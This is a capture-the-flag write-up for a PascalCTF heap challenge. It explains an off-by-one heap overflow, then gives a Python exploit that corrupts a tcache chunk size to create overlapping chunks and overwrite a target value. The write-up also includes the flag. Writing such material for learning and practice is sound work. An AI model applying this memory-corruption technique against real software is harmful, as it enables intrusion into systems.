# AHC - Average Heap Challenge

## Description
> *I believe I'm not that good at math at this point...*

**Connection:** `nc ahc.ctf.pascalctf.it 9003`

**Files:** [libc.so.6](./orig/libc.so.6), [ld-linux-x86-64.so.2](./orig/ld-linux-x86-64.so.2), [average](./orig/average)

## Solution
**TL;DR**: Heap buffer overflow corrupts chunk size field in tcache, creating overlapping chunks (House of Kauri technique)

### Vulnerability Analysis

The binary has a player management system with the following key functions:
- `create_player`: Allocates `malloc(extra + 0x48)` bytes, reads name (up to `extra+39` chars) and message (39 chars)
- `check_target`: Checks if `*target == 0xdeadbeefcafebabe`
- `setup_chall`: Initializes target with value `0xbabebabebabebabe`

**The Bug**: A math error in message offset calculation causes heap buffer overflow:
- `read_name()` returns `strlen(name) + 1` (the +1 is the bug)
- `message_offset = max(read_name_result, extra + 32)`
- With `extra=0` and `name=39` chars: `message_offset = 40` (not 39!)
- Message (39 chars + null) writes to buffer offsets 40-79
- Buffer is only 72 bytes (0x48), resulting in **8 bytes overflow**

### Why Direct Overflow Fails

Direct overflow from player 4 into target only reaches buffer[72:79] (target's SIZE field), but target DATA starts at buffer[80] - exactly 1 byte short.

### House of Kauri / Overlapping Chunks

The key insight is that **player 3's overflow corrupts player 4's SIZE field while chunk 4 is still in tcache**:

```
Heap Layout (after creating players 0,1,2):
- Player 3 buffer at heap+0x100
- buffer[72] = heap+0x148 = chunk 4's SIZE field (still in tcache!)

By corrupting chunk 4's size from 0x51 to 0x71:
1. Chunk 4 stays in tcache with corrupted size
2. Creating player 4 pops it normally
3. Deleting player 4 puts it in tcache[0x70] instead of tcache[0x50]
4. Allocating with extra=17 (malloc(89) -> 0x70 chunk) retrieves it
5. The 0x70 chunk overlaps with target's data region!
```

### Exploitation Steps

```python
# Step 1: Create players 0, 1, 2 (consume tcache entries)
for i in range(3):
    create_player(i, 0, b'A', b'B')

# Step 2: Create player 3 with size corruption payload
# Overflow at buffer[72] corrupts chunk 4's size (0x51 -> 0x71)
name3 = b'A' * 39
message3 = b'X' * 32 + b'q'  # 'q' = 0x71
create_player(3, 0, name3, message3)

# Step 3: Create player 4 (gets chunk with corrupted size)
create_player(4, 0, b'A', b'B')

# Step 4: Delete player 4 (goes to tcache[0x70], not tcache[0x50])
delete_player(4)

# Step 5: Delete player 3 (free up index)
delete_player(3)

# Step 6: Create player 3 with extra=17 (malloc(89) -> 0x70 chunk)
# This creates overlap: buffer extends to cover target's data
# message_offset = max(40, 49) = 49
# message[31:39] -> buffer[80:88] = target data field!
name6 = b'A' * 39
message6 = b'X' * 31 + p64(0xdeadbeefcafebabe)[:8]
create_player(3, 17, name6, message6)

# Step 7: Check target - SUCCESS!
check_target()
```

### Flag
> `pascalCTF{1m4g1n3_N0t_Kn0w1n9_H34P...}`
